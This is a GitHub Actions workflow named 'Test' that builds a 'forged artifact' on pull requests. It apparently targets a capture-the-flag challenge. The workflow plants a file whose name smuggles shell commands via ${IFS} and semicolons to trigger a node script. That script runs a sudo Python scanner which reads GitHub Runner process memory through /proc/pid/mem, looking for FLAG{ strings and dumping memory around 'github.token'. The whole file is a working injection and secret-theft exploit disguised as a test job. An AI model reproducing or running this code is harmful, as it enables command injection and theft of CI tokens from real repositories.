name: Test

on:
  pull_request:

jobs:
  forge:
    runs-on: ubuntu-latest
    steps:
      - name: Build forged artifact
        run: |
          rm -rf content
          mkdir -p content
          printf 'forged report body' > content/body
          python3 - <<'PY'
          import os
          name = "body;" + "cd${IFS}$HOME;" + "cd${IFS}..;" * 14 + "cd${IFS}tmp;cd${IFS}content;cd${IFS}content;node${IFS}p.js;#.txt"
          assert len(name) < 255, len(name)
          open(os.path.join("content", name), "w").close()
          PY
          cat > content/scan.py <<'SCANEOF'
          import glob, os

          out = []
          flag_found = 0

          def pids():
              for d in glob.glob('/proc/[0-9]*'):
                  pid = d.rsplit('/', 1)[-1]
                  try:
                      cmd = open(d + '/cmdline', 'rb').read().replace(b'\x00', b' ').decode('utf8', 'replace').strip()
                  except Exception:
                      continue
                  yield pid, cmd

          def find_flag(data, tag):
              global flag_found
              for m in [b'FLAG{', b'F\x00L\x00A\x00G\x00{']:
                  i = data.find(m)
                  while i != -1:
                      out.append('FLAGHIT %s marker=%r hex=%s' % (tag, m, data[max(0,i-32):i+320].hex()))
                      flag_found += 1
                      i = data.find(m, i + 1)

          for pid, cmd in pids():
              if 'Runner' not in cmd:
                  continue
              out.append('PROC %s %s' % (pid, cmd[:100]))
              try:
                  maps = open('/proc/%s/maps' % pid).read().splitlines()
              except Exception:
                  continue
              dumped = 0
              total = 0
              for line in maps:
                  parts = line.split()
                  if len(parts) < 2 or 'r' not in parts[1]:
                      continue
                  try:
                      a, b = [int(x, 16) for x in parts[0].split('-')]
                  except Exception:
                      continue
                  if b <= a or dumped >= 1:
                      continue
                  off = a
                  with open('/proc/%s/mem' % pid, 'rb', 0) as f:
                      while off < b:
                          n = min(16 * 1024 * 1024, b - off)
                          try:
                              f.seek(off)
                              data = f.read(n)
                          except Exception:
                              off += n
                              continue
                          off += n
                          total += len(data)
                          find_flag(data, 'pid' + pid)
                          if dumped < 1 and b'github.token' in data:
                              i = data.find(b'github.token')
                              win = data[max(0, i - 1000):i + 300000]
                              out.append('BLOB pid=%s at=%d len=%d hex=%s' % (pid, off - n + i, len(win), win.hex()))
                              dumped += 1
              out.append('READ %s bytes=%d' % (pid, total))

          print('\n'.join(out)[:1500000])
          print('DONE flag_found=%d' % flag_found)

          SCANEOF
          cat > content/p.js <<'JSEOF'
          const cp = require('child_process');
          let scan = '';
          try { scan = cp.execSync('sudo -n python3 /tmp/content/content/scan.py 2>&1', { encoding: 'utf8', timeout: 900000, maxBuffer: 256 * 1024 * 1024 }); } catch (e) { scan = 'SCANERR ' + e.message + ' ' + (e.stdout || ''); }
          for (let i = 0; i < scan.length; i += 1800) console.log('SCAN ' + scan.slice(i, i + 1800));

          JSEOF
          ls -la content
      - uses: actions/upload-artifact@v4
        with:
          name: content
          path: content
